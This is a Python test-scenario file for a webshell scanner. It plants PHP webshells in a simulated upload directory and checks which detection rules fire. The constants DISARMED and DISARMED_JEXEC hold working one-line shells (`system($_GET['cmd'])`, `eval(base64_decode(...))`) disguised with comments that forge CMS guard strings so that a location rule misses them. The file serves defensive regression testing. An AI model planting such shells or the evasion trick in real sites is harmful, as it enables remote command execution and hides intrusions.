# shellforge/scenarios/false_guard.py
"""false-guard -- the documented limitation, as a test.

Shellhound's location rule is disarmed by a string. `docs/rules.md` says so
plainly: "the guard is searched for as a string, not checked structurally --
a `// _JEXEC` in a comment disarms this rule. The content rules below still
apply then."

A limitation stated in prose is a limitation nobody notices changing. This
case pins both halves of that sentence:

    the location rule stays silent    because the guard string is present
    the content rules still fire      because they never looked at location

If the first half broke, this case would report a false positive on a file
whose guard is real. If the second broke, a shell would go missing entirely.
Neither is a hypothetical: the whole discriminator of the webshell scanner is
that string, and it is four characters of comment away from being wrong.

The case is not an argument for changing the rule. Parsing PHP to decide
whether a guard is structurally live is a large amount of work for an
attacker who then writes `if (!defined('ABSPATH')) {}` instead. It is an
argument for knowing exactly what the rule promises.
"""
from __future__ import annotations

from datetime import datetime, timedelta

from shellforge.render.accesslog import Request
from shellforge.scenarios import Case, common, register
from shellforge.truth import GroundTruth, Planted
from shellforge.world import SCALES

#: A shell wearing the guard as a comment. The location rule sniffs the first
#: 4 KB for `ABSPATH` and finds it; the file is nonetheless a shell.
DISARMED = ("<?php\n"
            "// ABSPATH check handled by the loader, see ticket 4711\n"
            "@system($_GET['cmd']);\n")

#: The same trick with Joomla's constant, which is the spelling the
#: documentation uses. Present so the case does not depend on one CMS's
#: choice of guard word.
DISARMED_JEXEC = ("<?php\n"
                  "/* _JEXEC verified upstream */\n"
                  "eval(base64_decode($p));\n")

#: And the honest version: a real guard, real code, nothing to find. If the
#: rule ever starts reading the guard structurally, THIS is the file that
#: must keep its silence.
HONEST = ("<?php\n"
          "if (!defined('ABSPATH')) {\n    exit;\n}\n"
          "function bg_thumb_size($w) { return max(64, (int) $w); }\n")


@register("false-guard")
def build(rng, site, scale: str = "small") -> Case:
    _p, _m, _po, days, per_day = SCALES[scale][:5]
    truth = GroundTruth(seed=rng.seed, scenario="false-guard",
                        cms=site.kind, cms_version=site.version)
    case = Case(site=site, truth=truth, files=dict(site.files))
    start = datetime(2026, 1, 5)
    attack_day = start + timedelta(days=int(days * 0.5))

    requests, editor_ip = common.baseline(rng.derive("baseline"), site, start,
                                          days, per_day)
    case.requests = requests + common.scanner_noise(rng.derive("scanners"),
                                                    start, days)

    upload_month = f"{site.upload_dir}/2026/01"
    attacker = rng.ip("attacker")
    t0 = rng.moment(attack_day, 2, 4)

    disarmed = f"{upload_month}/gallery-init.php"
    case.files[disarmed] = DISARMED
    case.added_paths.append(disarmed)
    truth.plant(Planted(
        kind="file", ident=f"/{disarmed}",
        expect_rules=["webshell.cmd_input"], expect_severity="high",
        note="a shell in an upload directory carrying `ABSPATH` in a "
             "COMMENT. The location rule is disarmed by exactly that string; "
             "the content rule catches it anyway, which is why the two "
             "layers exist"))
    truth.keep_quiet(
        f"/{disarmed}", rules=["webshell.upload_php"],
        reason="the documented limitation, asserted rather than described: "
               "the guard is matched as a string, so this file does not "
               "trip the location rule. The case exists so that a change "
               "here is noticed on purpose instead of discovered in an "
               "incident")

    jexec = f"{upload_month}/tpl-loader.php"
    case.files[jexec] = DISARMED_JEXEC
    case.added_paths.append(jexec)
    truth.plant(Planted(
        kind="file", ident=f"/{jexec}",
        expect_rules=["webshell.eval_input"], expect_severity="high",
        note="the same trick with Joomla's guard word, so the case does not "
             "rest on one CMS's spelling"))
    truth.keep_quiet(
        f"/{jexec}", rules=["webshell.upload_php"],
        reason="as above: `_JEXEC` inside a comment is enough")

    honest = f"{upload_month}/bg-thumb.php"
    case.files[honest] = HONEST
    truth.keep_quiet(
        f"/{honest}",
        reason="a genuine guarded file that happens to live in an upload "
               "directory -- CMS plugins really do put PHP there. It must "
               "stay silent, and it is the file that would start screaming "
               "if the guard check were tightened carelessly")

    for i in range(rng.randint(3, 8)):
        case.requests.append(Request(
            when=t0 + timedelta(minutes=4 + i * rng.randint(3, 25)),
            ip=attacker, method="GET", uri=f"/{disarmed}?cmd=id", status=200,
            size=rng.randint(40, 700), agent=common.QUIET_UA))
    truth.plant(Planted(
        kind="client", ident=attacker,
        expect_rules=["logs.upload_php"], expect_severity="high",
        note="the log rule is untouched by the guard trick -- it never reads "
             "the file. Which is the case for having it: the log finding "
             "survives whatever the file does to disguise itself"))
    truth.event(t0, attacker, "drop_shell", f"{disarmed}, guard forged")
    truth.event(t0 + timedelta(minutes=4), attacker, "use_shell",
                f"GET /{disarmed}?cmd=id answered 200")

    common.plant_scanners(truth, case.requests)
    common.plant_editor(truth, editor_ip, case.requests, site)
    common.plant_core_silence(truth, site)
    truth.note(
        "Three files in one upload directory: a shell with a forged guard, a "
        "second with a different forged guard, and an honest guarded file. A "
        "correct run reports the first two on content and says nothing about "
        "the third or about their location.")
    return case
